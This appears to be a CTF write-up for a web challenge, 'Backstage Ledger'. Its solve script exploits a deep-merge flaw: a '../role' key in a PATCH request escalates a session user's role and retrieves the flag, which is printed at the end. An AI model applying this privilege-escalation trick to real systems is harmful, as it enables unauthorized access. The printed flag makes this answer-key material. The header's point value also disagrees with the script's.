---
title: "Backstage Ledger"
ctf: "Safaricom CTF"
date: 2026-10-04
category: web
difficulty: medium
points: 500
flag_format: "safctf{...}"
author: "nomadspecter <the.nomad.specter@gmail.com>"
---

# Backstage Ledger

## Summary

- **Target:** `http://54.72.82.22:8340`

## Solution

### Step 1: Run the solve script:

```python
#!/usr/bin/env python3
"""Backstage Ledger (API, 300) -- http://54.72.82.22:8340

The challenge runs the shared organizer runtime with kind="api-merge".
/api/profile deep-merges the client-supplied "profile" object into the session
user.  A key beginning with "../" escapes the profile sub-dict and writes the
PARENT object instead -- so "../role" sets user["role"] directly.

  PATCH /api/profile  {"profile": {"../role": "producer"}}
  GET   /api/settlement    -> 200 {"message": "safctf{...}", "ok": true}

Requires the same X-Session token on both calls (the user is keyed by it).
"""
import sys, requests

BASE = "http://54.72.82.22:8340"
SESSION = "backstage-probe"

def main():
    h = {"X-Session": SESSION, "Content-Type": "application/json"}
    before = requests.get(BASE + "/api/profile", headers=h, timeout=15).json()
    print("[*] before:", before)

    r = requests.patch(BASE + "/api/profile", headers=h,
                       json={"profile": {"../role": "producer"}}, timeout=15)
    print("[*] after patch:", r.json())
    assert r.json().get("role") == "producer", "key escape failed"

    r = requests.get(BASE + "/api/settlement", headers=h, timeout=15)
    print("[+] settlement:", r.status_code, r.text)
    assert r.status_code == 200 and "safctf{" in r.text, "no flag"
    return 0

if __name__ == "__main__":
    sys.exit(main())

```

## Flag

```
safctf{414329f08fe10f2027b4afeb2e5bba9b}
```
